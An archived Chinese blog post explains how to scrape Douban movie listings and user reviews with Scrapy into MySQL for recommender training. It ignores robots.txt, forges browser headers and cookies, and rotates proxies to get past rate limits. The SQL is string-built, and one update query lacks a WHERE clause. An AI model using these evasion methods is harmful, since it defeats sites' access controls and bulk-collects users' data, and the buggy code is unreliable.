<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>  
	  
  	Python - 独自一人
  	
	</title>

  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

	<link href="atom.xml" rel="alternate" title="独自一人" type="application/atom+xml">

	<link href="asset/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<link href="asset/stylesheets/font-awesome.min.css" media="screen, projection" rel="stylesheet" type="text/css">
	<script src="asset/javascripts/jquery.min.js"></script>
	<script src="asset/highlightjs/highlight.pack.js"></script>
	<link href="asset/highlightjs/styles/solarized_dark.css" media="screen, projection" rel="stylesheet" type="text/css">
<script>hljs.initHighlightingOnLoad();</script>

	<!--[if lt IE 9]><script src="asset/javascripts/html5.js"></script><![endif]-->
	<!-- <link href='http://fonts.googleapis.com/css?family=Nunito:400,300,700' rel='stylesheet' type='text/css'> -->
	<style type="text/css">
/* latin */
@font-face {
  font-family: 'Nunito';
  font-style: normal;
  font-weight: 300;
  src: local('Nunito-Light'), url(asset/font/1TiHc9yag0wq3lDO9cw0voX0hVgzZQUfRDuZrPvH3D8.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
/* latin */
@font-face {
  font-family: 'Nunito';
  font-style: normal;
  font-weight: 400;
  src: local('Nunito-Regular'), url(asset/font/6TbRXKWJjpj6V2v_WyRbMX-_kf6ByYO6CLYdB4HQE-Y.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
/* latin */
@font-face {
  font-family: 'Nunito';
  font-style: normal;
  font-weight: 700;
  src: local('Nunito-Bold'), url(asset/font/TttUCfJ272GBgSKaOaD7KoX0hVgzZQUfRDuZrPvH3D8.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}
	</style>
	
	<style type="text/css">
	.container .left-col{ opacity: 1;}
	#pagenavi a{ font-size: 1.3em;}
	#pagenavi .next:before{ top: 3px;}
	#pagenavi .prev:before{ top: 3px;}
	.container .mid-col .mid-col-container #content .archives .title{ font-size: 1.5em;}
	.container .mid-col .mid-col-container #content article{ padding: 15px 0px;}
	#header .subtitle {
		line-height: 1.2em;
		padding-top: 8px;
	}
	article pre{ background: none; border: none; padding: 0;}
	article .entry-content{text-align: left;}
	.share-comment{ padding: 25px 0px; clear: both;}
	hr{ margin: 20px 0px;border: 0; border-top:solid 1px #ddd;}
	</style>
  

</head>


<body>
	<div class="container">
		<div class="left-col">
			<div class="intrude-less">
				<header id="header" class="inner">
				 
				 	<div class="profilepic">
						<img src="https://pic.mylonly.com/2017-05-11-IMG_1164.JPG" style="width:160px;">
					</div>
            	
					
					<h1><a href="index.html">独自一人</a></h1>
					<p class="subtitle">独自一人,独自Coding...</p>
					<nav id="main-nav">
						<ul class="main">
						
						  <li id=""><a target="self" href="index.html">Home</a></li>
						
						  <li id=""><a target="_self" href="archives.html">Archives</a></li>
						
						</ul>
					</nav>

					<nav id="sub-nav">
						<div class="social">










<a target="_blank" class="github" target="_blank" href="https://github.com/mylonly" title="GitHub">GitHub</a>
<a target="_blank" class="email" href="mailto:root@mylonly.com" title="Email">Email</a>

								

								<a class="rss" href="atom.xml" title="RSS">RSS</a>
							
						</div>
					</nav>
				</header>				
			</div>
		</div>	
		<div class="mid-col">
			<div class="mid-col-container"> <div id="content" class="inner">
<div itemscope itemtype="http://schema.org/Blog">


	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
				<time datetime="2018-07-06T15:20:20+08:00" itemprop="datePublished">2018/7/6</time>
			</div>
			<div class="tags">posted in 
			
			    <a class='category' href='python.html'>Python</a>&nbsp;
			 
			</div>
		</div>
		<h1 class="title" itemprop="name"><a href="15308616208129.html" itemprop="url">
		我的豆瓣电影影评抓取之旅</a></h1>
		<div class="entry-content" itemprop="articleBody">
			
			<p><a href="https://juejin.im/entry/5b4027d36fb9a04f9078f090/detail"><img src="https://badge.juejin.im/entry/5b4027d36fb9a04f9078f090/likes.svg?style=flat-square" alt=""/></a></p>

<h2 id="toc_0">前言</h2>

<p>由于最近一直在研究基于机器学习的推荐系统，需要大量的数据来训练AI模型，但是在模型的测试验证过程中，苦于中文数据集的缺失(或者说根本没有，国人在这方面做得实在是太差了)，只能利用国外公开的推荐系统数据集，有著名的<a href="https://grouplens.org/datasets/movielens/">MovieLens电影评分数据集</a>和<a href="http://del.icio.us">Del.icio.us链接推荐数据集</a>，虽然通过计算损失函数也能大致的评估推荐模型的优劣程度从而进行相应的优化，但是由于语言环境、文化等等的不同，国外人对某个电影的评分毕竟跟我们还是有一定差距的，在输出推荐结果时，即使给出的某个电影或者某个网站链接其相似度很高时，我仍然不确定这个推荐结果是否真的如损失函数计算的那样准确。所以，为了能拥有一个可以用于训练的中文的数据集，就有了本文所记录的豆瓣影评的抓取过程。</p>

<h2 id="toc_1">网站分析</h2>

<p>首先还是要分析一下要抓取的网站<a href="https://movie.douban.com/">豆瓣电影</a>,主要是通过搜索引擎或者浏览器的调试工具看看有没有可以利用的API，在没有找到任何api的前提下才开始分析网站的页面结构，找到可以提取的信息。<br/>
通过搜索引擎，我找到了<a href="https://developers.douban.com/wiki/?title=api_v2">豆瓣开发者平台</a>，在<a href="https://developers.douban.com/wiki/?title=movie_v2">豆瓣电影</a>的文档中有获取电影，获取影评等等的详细接口，正当我以为接下来的数据采集将会变得非常简单之时，下面这张图还是让我冷静了下来<br/>
<img src="https://pic.mylonly.com/2018-07-07-122829.jpg" alt=""/></p>

<blockquote>
<p>如果你在2015年之前注册过豆瓣的开发者，那么恭喜你,你可以通过豆瓣提供的API或者SDK获取你想获得的任何数据</p>
</blockquote>

<h3 id="toc_2">电影信息获取</h3>

<p>虽然APIKey是不可能拿到了，但是通过文档我仍然发现了一些GET请求并不需要AUTH认证，也就是说有没有APIKey并不影响使用。其中，对我们有用的就是获取<code>TOP250电影列表</code>的接口:</p>

<pre><code>http://api.douban.com/v2/movie/top250
</code></pre>

<p>接口返回的格式大概如下:<br/>
<img src="https://pic.mylonly.com/2018-07-07-122848.jpg" alt=""/><br/>
里面包含了电影一些详细信息，对于推荐系统来说，这些数据足够了。</p>

<p>此外，通过利用Chrome的调试工具，在<a href="https://movie.douban.com/tag/#/">豆瓣电影-分类</a>这个页面我发现了他们使用的一个JQuery接口,也是一个GET请求，不需要AUTH。</p>

<p><img src="https://pic.mylonly.com/2018-07-07-122901.jpg" alt=""/><br/>
<img src="https://pic.mylonly.com/2018-07-07-123038.jpg" alt=""/></p>

<p>详细接口如下,可以通过更改start来迭代获取所有电影条目</p>

<pre><code>https://movie.douban.com/j/new_search_subjects?sort=T&amp;range=0,10&amp;tags=&amp;start=20
</code></pre>

<p>这个接口可以获取所有豆瓣上收录的电影，经过我的测试，start改为10000时，返回的数据就已经是空的了</p>

<h3 id="toc_3">影评信息获取</h3>

<p>获取电影信息的方法有了，接下来就是要分析如何获取影评信息了。<br/>
在每部电影的详情页面里,如<a href="https://movie.douban.com/subject/1292064/">楚门的世界</a>，我们找到了如下这几个详情页面,分别显示了针对这部电影的影评和短评信息</p>

<pre><code>https://movie.douban.com/subject/1292064/reviews ##影评页面
https://movie.douban.com/subject/1292064/comments ##短评页面
</code></pre>

<p><img src="https://pic.mylonly.com/2018-07-06-085101.png" alt=""/></p>

<p>照例先用调试工具看看有没有可以用的api接口后，发现这次并没有那么好运了，这个影评页面是由服务器渲染完成的。</p>

<p>没有了接口，我们来分析页面，依然通过调试工具:<br/>
<img src="https://pic.mylonly.com/2018-07-07-122913.jpg" alt=""/><br/>
每条评论都是在一个review-item的div块里面，而所有评论都是在一个review-list的div块里吗，我们通过xpath语法可以很容易的定位到每条评论的详细信息,下面是所有信息的xpath语句，在我们写爬虫时候就靠他提取内容了</p>

<pre><code>评论列表: &quot;//div[contains(@class,&#39;review-list&#39;)]//div[contains(@class,&#39;review-item&#39;)]&quot;

评论ID: &quot;.//div[@class=&#39;main-bd&#39;]//div[@class=&#39;review-short&#39;]/@data-rid&quot;
作者头像: &quot;./header[@class=&#39;main-hd&#39;]//a[@class=&#39;avator&#39;]//img/@src &quot;
作者昵称: &quot;.//header//a[@class=&#39;name&#39;]/text()&quot;
推荐程度(评分): &quot;.//header//span[contains(@class,&#39;main-title-rating&#39;)]/@title&quot;
影评标题: &quot;.//div[@class=&#39;main-bd&#39;]//h2//a/text()&quot;
影评摘要: &quot;.//div[@class=&#39;main-bd&#39;]//div[@class=&#39;short-content&#39;]/text()&quot;
影评详情页链接: &quot;.//div[@class=&#39;main-bd&#39;]//h2//a/@href&quot;
</code></pre>

<p><img src="https://pic.mylonly.com/2018-07-06-090909.png" alt=""/></p>

<p>其中具体的评分我们不能直接拿到，而是只能拿到具体的文字描述,经过我的验证，具体如下对应关系如下:</p>

<pre><code>&#39;力荐&#39;: 5,
&#39;推荐&#39;: 4,
&#39;还行&#39;: 3,
&#39;较差&#39;: 2,
&#39;很差&#39;: 1,  
</code></pre>

<p>在后续的代码编写过程中，我们会根据这个对应关系将其转换为对应的评分信息</p>

<h2 id="toc_4">实现爬虫</h2>

<p>既然已经分析的差不多了，我们所需要的信息基本都有途径可以获得，那么接下来我们就开始具体的爬虫实现，我们采用Scrapy这个Python爬虫框架来帮我们简化爬虫的开发过程。Scrapy的安装以及VirtualEnv环境的搭建就不详细说了，其并不再本文的讨论范围之内，附上<a href="http://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/overview.html">Scrapy的中文文档地址</a></p>

<h3 id="toc_5">创建项目工程</h3>

<pre><code>##创建DoubanSpider工程
scrapy startproject Douban
</code></pre>

<p>创建好的工程目录大致如下:<br/>
<img src="https://pic.mylonly.com/2018-07-07-122926.jpg" alt=""/><br/>
其中：</p>

<pre><code>    spiders: 爬虫文件夹,存放具体的爬虫代码，我们待会要编写的两个爬虫(电影信息和影评信息)就需要放在这个文件夹下
    items.py: 模型类，所有需要结构化的数据都要预先在此文件中定义
    middlewares.py: 中间件类，scrapy的核心之一，我们会用到其中的downloadMiddleware,
    pipelines.py: 管道类，数据的输出管理，是存数据库还是存文件在这里决定
    settings.py: 设置类，一些全局的爬虫设置，如果每个爬虫需要有自定义的地方，可以在爬虫中直接设置custom_settings属性
</code></pre>

<h3 id="toc_6">电影信息爬虫</h3>

<blockquote>
<p>由于电影信息的获取有API接口可以使用，所以此处页可以不采用爬虫来处理数据。</p>
</blockquote>

<p>在spiders中新建一个movies.py的文件，定义我们的爬虫</p>

<p>由于我们爬取电影是通过api接口的形式获取，因此并不需要跟进解析，所以我们的爬虫直接继承Spider就可以了</p>

<h4 id="toc_7">定义爬虫</h4>

<pre><code>class MovieSpider(Spider):
    name = &#39;movie&#39; #爬虫名称
    allow_dominas = [&quot;douban.com&quot;] #允许的域名
    
    #自定义的爬虫设置，会覆盖全局setting中的设置
    custom_settings = {
        &quot;ITEM_PIPELINES&quot;: {
            &#39;Douban.pipelines.MoviePipeline&#39;: 300
        },
        &quot;DEFAULT_REQUEST_HEADERS&quot;: {
            &#39;accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;,
            &#39;accept-encoding&#39;: &#39;gzip, deflate&#39;,
            &#39;accept-language&#39;: &#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,
            &#39;referer&#39;: &#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,
            &#39;user-agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,
            &#39;x-requested-with&#39;: &#39;XMLHttpRequest&#39;,
        },
        &quot;ROBOTSTXT_OBEY&quot;:False #需要忽略ROBOTS.TXT文件
    }

</code></pre>

<p>custom_setting中，<code>ITEM_PIPELINES</code>指定了获取数据后数据输出时使用的管道接口<br/>
<code>DEFAULT_REQUEST_HEADERS</code>则是让我们的Spider伪装成一个浏览器，防止被豆瓣拦截掉。<br/>
而<code>ROBOTSTXT_OBEY</code>则是让我们的爬虫忽略ROBOTS.txt的警告</p>

<p>接下来通过<code>start_request</code>告诉爬虫要爬取的链接：</p>

<pre><code class="language-Python">
    def start_requests(self):
        url = &#39;&#39;&#39;https://movie.douban.com/j/new_search_subjects?sort=T&amp;range=0,10&amp;tags=&amp;start={start}&#39;&#39;&#39;
        requests = []
        for i in range(500):
            request = Request(url.format(start=i*20), callback=self.parse_movie)
            requests.append(request)
        return requests
</code></pre>

<p>由于我们之前分析网站的时候已经分析过了，start参数到10000时就获取不到数据了，所以此处直接用这个数字循环获得所有链接</p>

<p>接下来解析每个接口返回的内容:</p>

<pre><code class="language-Python">
def parse_movie(self, response):
    jsonBody = json.loads(response.body)
    subjects = jsonBody[&#39;data&#39;]
    movieItems = []
    for subject in subjects:
        item = MovieItem()
        item[&#39;id&#39;] = int(subject[&#39;id&#39;])
        item[&#39;title&#39;] = subject[&#39;title&#39;]
        item[&#39;rating&#39;] = float(subject[&#39;rate&#39;])
        item[&#39;alt&#39;] = subject[&#39;url&#39;]
        item[&#39;image&#39;] = subject[&#39;cover&#39;]
        movieItems.append(item)
    return movieItems
</code></pre>

<p>在request中，我们指定了一个parse_movie的方法来解析返回的内容，此处我们需要使用一个在items.py中定义的Item,具体Item如下:</p>

<h4 id="toc_8">定义Item</h4>

<pre><code class="language-Python">#定义你需要获取的数据
class MovieItem(scrapy.Item):
    id = scrapy.Field()
    title = scrapy.Field()
    rating = scrapy.Field()
    genres = scrapy.Field()
    original_title = scrapy.Field()
    alt = scrapy.Field()
    image = scrapy.Field()
    year = scrapy.Field()
</code></pre>

<p>items返回给Scrapy之后，Scrapy会调用我们之前在custom_setting中指定的<code>Douban.pipelines.MoviePipeline</code>来处理获取到的item，MoviePipeline定义在pipelines.py中，具体内容如下:</p>

<h4 id="toc_9">定义Pipeline</h4>

<pre><code class="language-Python">class MoviePipeline(object):

    movieInsert = &#39;&#39;&#39;insert into movies(id,title,rating,genres,original_title,alt,image,year) values (&#39;{id}&#39;,&#39;{title}&#39;,&#39;{rating}&#39;,&#39;{genres}&#39;,&#39;{original_title}&#39;,&#39;{alt}&#39;,&#39;{image}&#39;,&#39;{year}&#39;)&#39;&#39;&#39;

    def process_item(self, item, spider):

        id = item[&#39;id&#39;]
        sql = &#39;select * from movies where id=%s&#39;% id
        self.cursor.execute(sql)
        results = self.cursor.fetchall()
        if len(results) &gt; 0:
            rating = item[&#39;rating&#39;]
            sql = &#39;update movies set rating=%f&#39; % rating
            self.cursor.execute(sql)
        else:
            sqlinsert = self.movieInsert.format(
                id=item[&#39;id&#39;],
                title=pymysql.escape_string(item[&#39;title&#39;]),
                rating=item[&#39;rating&#39;],
                genres=item.get(&#39;genres&#39;),
                original_title=item.get(&#39;original_title&#39;),
                alt=pymysql.escape_string(item.get(&#39;alt&#39;)),
                image=pymysql.escape_string(item.get(&#39;image&#39;)),
                year=item.get(&#39;year&#39;)
            )
            self.cursor.execute(sqlinsert)
        return item

    def open_spider(self, spider):
        self.connect = pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;******&#39;,&#39;douban&#39;, charset=&#39;utf8&#39;, use_unicode=True)
        self.cursor = self.connect.cursor()
        self.connect.autocommit(True)


    def close_spider(self, spider):
        self.cursor.close()
        self.connect.close()

</code></pre>

<p>在此Pipeline中，我们通过连接mysql数据库将每次获取到的item插入到具体的数据表中</p>

<h4 id="toc_10">运行爬虫</h4>

<p>在命令行下输入:</p>

<pre><code>scrapy crawl movie
</code></pre>

<p><img src="https://pic.mylonly.com/2018-07-06-101458.png" alt=""/><br/>
<img src="https://pic.mylonly.com/2018-07-06-101353.png" alt=""/></p>

<h3 id="toc_11">影评爬虫</h3>

<p>影评爬虫的难度要大很多了，因为获取电影信息我们是通过接口直接拿到的，这种接口返回的数据格式统一，基本不会出现异常情况，而且电影数量有限，很短时间就能爬取完毕，并不会触发豆瓣的防爬虫机制，而在影评爬虫的编写过程中，这些都会遇到。</p>

<h4 id="toc_12">爬虫逻辑</h4>

<pre><code>class ReviewSpider(Spider):
    name = &quot;review&quot;
    allow_domain = [&#39;douban.com&#39;]
    custom_settings = {
        &quot;ITEM_PIPELINES&quot;: {
            &#39;Douban.pipelines.ReviewPipeline&#39;: 300
        },
        &quot;DEFAULT_REQUEST_HEADERS&quot;: {
            &#39;connection&#39;:&#39;keep-alive&#39;,
            &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;,
            &#39;DNT&#39;:1,
            &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;,
            &#39;Accept-Encoding&#39;:&#39;gzip, deflate, br&#39;,
            &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&#39;,
            &#39;Cookie&#39;:&#39;bid=wpnjOBND4DA; ll=&quot;118159&quot;; __utmc=30149280;&#39;,            &#39;user-agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) &#39;
                          &#39;Chrome/67.0.3396.87 Safari/537.36&#39;,
        },
        &quot;ROBOTSTXT_OBEY&quot;: False,
        # &quot;DOWNLOAD_DELAY&quot;: 1,
        &quot;RETRY_TIMES&quot;: 9,
        &quot;DOWNLOAD_TIMEOUT&quot;: 10
    }
</code></pre>

<p>对比获取电影信息的爬虫，在custom_setting中多了几个设置：<br/>
<code>RETRY_TIMES</code>：用来控制最大重试次数，因为豆瓣有反爬虫机制，当一个IP访问次数过多时就会限制这个IP访问，所以为了绕过这个机制，我们通过代理IP来爬取对应的页面，每爬取一个页面就更换一次IP，但是由于代理IP的质量参差不齐，收费的可能会好点，但还是会存在，为了避免出现因为代理连接不上导致某个页面被忽略掉，我们设置这个值，当重试次数大于设定的值时仍然没有获取到页面就会pass掉这个连接。如果你的代理IP质量不好，请增大此处的次数。<br/>
<code>DOWNLOAD_TIMEOUT</code>: 下载超时时间，默认是60秒，此处修改为10秒是想让整体的爬取速度加快，因为RETRY_TIMES的缘故，需要RETRY的判定时间为1分钟，如果有很多这种有问题的页面，那么整个爬取的过程会十分漫长。<br/>
<code>DOWNLOAD_DELAY</code>: 下载延迟，如果你使用代理IP之后还是会出现访问返回403的情况，请设置此值，因为某IP太频繁的访问页面会触发豆瓣的防爬虫机制。</p>

<pre><code class="language-Python">  def start_requests(self):
        #从数据库中找到所有的moviesId
        self.connect = pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;******&#39;,&#39;douban&#39;, charset=&#39;utf8&#39;, use_unicode=True)
        self.cursor = self.connect.cursor()
        self.connect.autocommit(True)
        sql = &quot;select id,current_page,total_page from movies&quot;
        self.cursor.execute(sql)
        results = self.cursor.fetchall()
        url_format = &#39;&#39;&#39;https://movie.douban.com/subject/{movieId}/reviews?start={offset}&#39;&#39;&#39;
        for row in results:
            movieId = row[0]
            current_page = row[1]
            total_page = row[2]
            if current_page != total_page: ##说明评论没有爬完
                url = url_format.format(movieId=movieId, offset=current_page*20)
                request = Request(url, callback=self.parse_review, meta={&#39;movieId&#39;: movieId}, dont_filter=True)
                yield request
</code></pre>

<p>照例，我们在start_request中告诉Scrapy要爬取的起始网址链接，通过我们之前的分析，影评页面的地址格式为:</p>

<pre><code class="language-Python">https://movie.douban.com/subject/{movieId}/reviews?start={offset}
</code></pre>

<p>而movieId,我们之前的爬虫已经将所有电影的信息抓取了下来，所以我们在此先通过查询数据库将所有的已抓取的电影信息获取到，取到其中的movieId，然后构造一个页面链接。</p>

<pre><code class="language-Python">url = url_format.format(movieId=movieId, offset=current_page*20)
</code></pre>

<p>因为抓取豆瓣影评的过程十分漫长，中间会出现各种各样的问题导致爬虫意外退出，因此我们需要一个机制让爬虫能从上次停止的地方继续爬取，current_page和total_page就是为此而服务的，在后面的数据解析过程中，每解析一个页面，就会将当期页面的页数存储下来，防止出现意外情况。</p>

<pre><code class="language-Python">    def parse_review(self, response):
        movieId = response.request.meta[&#39;movieId&#39;]
        review_list = response.xpath(&quot;//div[contains(@class,&#39;review-list&#39;)]//div[contains(@class,&#39;review-item&#39;)]&quot;)
        for review in review_list:
            item = ReviewItem()
            item[&#39;id&#39;] = review.xpath(&quot;.//div[@class=&#39;main-bd&#39;]//div[@class=&#39;review-short&#39;]/@data-rid&quot;).extract()[0]
            avator = review.xpath(&quot;.//header//a[@class=&#39;avator&#39;]/@href&quot;).extract()[0]
            item[&#39;username&#39;] = avator.split(&#39;/&#39;)[-2]
            item[&#39;avatar&#39;] = review.xpath(&quot;./header[@class=&#39;main-hd&#39;]//a[@class=&#39;avator&#39;]//img/@src&quot;).extract()[0]
            item[&#39;nickname&#39;] = review.xpath(&quot;.//header//a[@class=&#39;name&#39;]/text()&quot;).extract()[0]
            item[&#39;movieId&#39;] = movieId
            rate = review.xpath(&quot;.//header//span[contains(@class,&#39;main-title-rating&#39;)]/@title&quot;).extract()
            if len(rate)&gt;0:
                rate = rate[0]
                item[&#39;rating&#39;] = RATING_DICT.get(rate)
                item[&#39;create_time&#39;] = review.xpath(&quot;.//header//span[@class=&#39;main-meta&#39;]/text()&quot;).extract()[0]
                item[&#39;title&#39;] = review.xpath(&quot;.//div[@class=&#39;main-bd&#39;]//h2//a/text()&quot;).extract()[0]
                item[&#39;alt&#39;] = review.xpath(&quot;.//div[@class=&#39;main-bd&#39;]//h2//a/@href&quot;).extract()[0]
                summary = review.xpath(&quot;.//div[@class=&#39;main-bd&#39;]//div[@class=&#39;short-content&#39;]/text()&quot;).extract()[0]
                item[&#39;summary&#39;] = summary.strip().replace(&#39;\n&#39;, &#39;&#39;).replace(&#39;\xa0(&#39;,&#39;&#39;)
                yield item

        current_page = response.xpath(&quot;//span[@class=&#39;thispage&#39;]/text()&quot;).extract()
        total_page = response.xpath(&quot;//span[@class=&#39;thispage&#39;]/@data-total-page&quot;).extract()
        paginator = response.xpath(&quot;//div[@class=&#39;paginator&#39;]&quot;).extract()
        if len(paginator) == 0 and len(review_list): ##不存在导航条，但是评论列表存在，说明评论只有一页

            sql = &quot;update movies set current_page = 1, total_page=1 where id=&#39;%s&#39;&quot; % movieId
            self.cursor.execute(sql)

        elif len(paginator) and len(review_list):
            current_page = int(current_page[0])
            total_page = int(total_page[0])
            sql = &quot;update movies set current_page = %d, total_page=%d where id=&#39;%s&#39;&quot; % (current_page, total_page, movieId)
            self.cursor.execute(sql)
            if current_page != total_page:
                url_format = &#39;&#39;&#39;https://movie.douban.com/subject/{movieId}/reviews?start={offset}&#39;&#39;&#39;
                next_request = Request(url_format.format(movieId=movieId, offset=current_page*20),
                                       callback=self.parse_review,
                                       dont_filter=True, meta={&#39;movieId&#39;: movieId})
                yield next_request

        else:
            yield response.request
</code></pre>

<p>接下来，分析解析函数，DoubanItem的数据获取就不额外介绍了，利用之前分析时用到的xpath语句可以很容易的定义到具体内容。<br/>
其中movieId是起始链接中通过Request中Meta属性传递过来的，当然你可以通过分析网页找到包含movieId的地方。</p>

<pre><code>current_page = response.xpath(&quot;//span[@class=&#39;thispage&#39;]/text()&quot;).extract()
total_page = response.xpath(&quot;//span[@class=&#39;thispage&#39;]/@data-total-page&quot;).extract()
paginator = response.xpath(&quot;//div[@class=&#39;paginator&#39;]&quot;).extract()
</code></pre>

<p>上面基础代码的作用主要是为了获取影评页面的底部导航条</p>

<p><img src="https://pic.mylonly.com/2018-07-07-122943.jpg" alt=""/></p>

<p>但是这个导航条会有两种情况获取不到:</p>

<pre><code>1. 当某个电影的评论不足20条时，也就是只有一页评论。
2. 当触发了豆瓣的反爬虫的机制时，返回的页面并不是评论页面，而是一个验证页面，自然也找不到导航条
</code></pre>

<p>所以在下面的代码中，我通过这几个变量来判断了以上几种情况：</p>

<pre><code>1. 情况1时，不需要继续爬取剩下的评论，直接将current_page和total_page设置为1保存到movie表即可
2. 情况2时，由于此时触发了反爬虫机制，返回的页面没有我们的数据，如果我们直接忽略掉的话，会损失大量的数据（这种情况很常见），所以我们就干脆再试一次，返回request，让Scrapy重新爬取这个页面，因为每次重新爬取都会换一个新的代理IP，所以我们有很大概率下次抓取就是正常的。此处有一点需要注意：因为Scrapy默认会过滤掉重复请求，所以我们需要在构造Request的时候讲dont_filter参数设置为True,让其不要过滤重复链接。
3. 正常情况时，通过xpath语法获取的下一页评论的链接地址然后构造一个request交给Scrapy继续爬取
</code></pre>

<h4 id="toc_13">影评下载中间件</h4>

<p>上面说过，抓取影评页面时需要通过使用代理IP的方式来达到绕过豆瓣的反爬虫机制，具体代理的设置就需要在DownloadMiddleware中设置</p>

<pre><code class="language-Python">class DoubanDownloaderMiddleware(object):
# Not all methods need to be defined. If a method is not defined,
# scrapy acts as if the downloader middleware does not modify the
# passed objects.

ip_list = None

@classmethod
def from_crawler(cls, crawler):
    # This method is used by Scrapy to create your spiders.
    s = cls()
    crawler.signals.connect(s.spider_opened, signal=signals.spider_opened)
    return s

def process_request(self, request, spider):
    # Called for each request that goes through the downloader
    # middleware.

    # Must either:
    # - return None: continue processing this request
    # - or return a Response object
    # - or return a Request object
    # - or raise IgnoreRequest: process_exception() methods of
    #   installed downloader middleware will be called

    if self.ip_list is None or len(self.ip_list) == 0:
        response = requests.request(&#39;get&#39;,&#39;http://api3.xiguadaili.com/ip/?tid=555688914990728&amp;num=10&amp;protocol=https&#39;).text
        self.ip_list = response.split(&#39;\r\n&#39;)

    ip = random.choice(self.ip_list)
    request.meta[&#39;proxy&#39;] = &quot;https://&quot;+ip
    print(&quot;当前proxy:%s&quot; % ip)
    self.ip_list.remove(ip)
    return None

def process_response(self, request, response, spider):
    # Called with the response returned from the downloader.
    # Must either;
    # - return a Response object
    # - return a Request object
    # # - or raise IgnoreRequest

    if response.status == 403:
        res = parse.urlparse(request.url)
        res = parse.parse_qs(res.query)
        url = res.get(&#39;r&#39;)
        if url and len(url) &gt; 0 :
            request = request.replace(url=res[&#39;r&#39;][0])
        return request

    return response
</code></pre>

<p>其中主要就要实现两个函数，process_request和process_response，前者是每次爬取页面前Scrapy会调用这个函数，后者则是每次爬取完页面之后调用。<br/>
    在前者方法里，我们通过调用一个在线的代理ip获取接口，获取一个代理IP，然后设置request的proxy属性达到更换代理的功能，当然，你也可以通过文件读取代理IP。<br/>
    在后者的方法里，我们判断了状态码为403的状况，因为这个状态码标识当前的request被反爬虫禁止侦测并禁止了，而我们要做的就是把这个禁止的request地址重新包装下放到Scrapy的爬取队列当中。</p>

<h4 id="toc_14">影评Item</h4>

<pre><code class="language-Python">class ReviewItem(scrapy.Item):
id = scrapy.Field()
username = scrapy.Field()
nickname = scrapy.Field()
avatar = scrapy.Field()
movieId = scrapy.Field()
rating = scrapy.Field()
create_time = scrapy.Field()
title = scrapy.Field()
summary = scrapy.Field()
alt = scrapy.Field()
</code></pre>

<p>没啥好说的，想存啥就写啥</p>

<h4 id="toc_15">影评Pipeline</h4>

<pre><code class="language-Python">
class ReviewPipeline(object):

    reviewInsert = &#39;&#39;&#39;insert into reviews(id,username,nickname,avatar,summary,title,movieId,rating,create_time,alt) values (&quot;{id}&quot;,&quot;{username}&quot;, &quot;{nickname}&quot;,&quot;{avatar}&quot;, &quot;{summary}&quot;,&quot;{title}&quot;,&quot;{movieId}&quot;,&quot;{rating}&quot;,&quot;{create_time}&quot;,&quot;{alt}&quot;)&#39;&#39;&#39;

    def process_item(self, item, spider):
        sql_insert = self.reviewInsert.format(
            id=item[&#39;id&#39;],
            username=pymysql.escape_string(item[&#39;username&#39;]),
            nickname=pymysql.escape_string(item[&#39;nickname&#39;]),
            avatar=pymysql.escape_string(item[&#39;avatar&#39;]),
            summary=pymysql.escape_string(item[&#39;summary&#39;]),
            title=pymysql.escape_string(item[&#39;title&#39;]),
            rating=item[&#39;rating&#39;],
            movieId=item[&#39;movieId&#39;],
            create_time=pymysql.escape_string(item[&#39;create_time&#39;]),
            alt=pymysql.escape_string(item[&#39;alt&#39;])
        )
        print(&quot;SQL:&quot;, sql_insert)
        self.cursor.execute(sql_insert)
        return item

    def open_spider(self, spider):
        self.connect = pymysql.connect(&#39;localhost&#39;,&#39;root&#39;,&#39;******&#39;,&#39;douban&#39;, charset=&#39;utf8&#39;, use_unicode=True)
        self.cursor = self.connect.cursor()
        self.connect.autocommit(True)


    def close_spider(self, spider):
        self.cursor.close()
        self.connect.close()
</code></pre>

<pre><code>和之前的电影的pipeline类似，就是基本的数据库写操作。
</code></pre>

<h4 id="toc_16">运行爬虫</h4>

<pre><code class="language-Shell">scrapy crawl review
</code></pre>

<p>在我写完这篇文章时，影评的爬虫仍然还在爬取当中：<br/>
<img src="https://pic.mylonly.com/2018-07-06-113420.png" alt=""/><br/>
查看数据库，已经有97W的数据了:</p>

<p><img src="https://pic.mylonly.com/2018-07-06-113210.png" alt=""/><br/>
<img src="https://pic.mylonly.com/2018-07-06-113607.png" alt=""/></p>

<p><em>如果你觉得我的文章对你有帮助，请赞助一杯☕️</em></p>

<p><img src="https://pic.mylonly.com/2018-07-06-IMG_2094-1.JPG" alt=""/></p>


			
			
		</div>

	</article>
 
	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
		<div class="meta">
			<div class="date">
